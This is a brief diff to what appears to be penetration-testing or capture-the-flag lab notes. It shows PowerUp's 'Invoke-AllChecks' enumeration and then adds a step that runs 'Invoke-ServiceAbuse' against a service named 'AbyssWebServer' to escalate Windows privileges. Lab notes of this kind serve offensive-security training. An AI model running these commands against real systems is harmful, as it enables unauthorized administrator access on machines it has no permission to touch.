@@ -132,3 +132,8 @@ And launch the enumeration for possible privesc
 ```PowerUp
 Invoke-AllChecks
 ```
+![[Pasted image 20231018145259.png]]
+Abuse the service
+```PowerUp
+Invoke-ServiceAbuse -Name 'AbyssWebServer'
+```
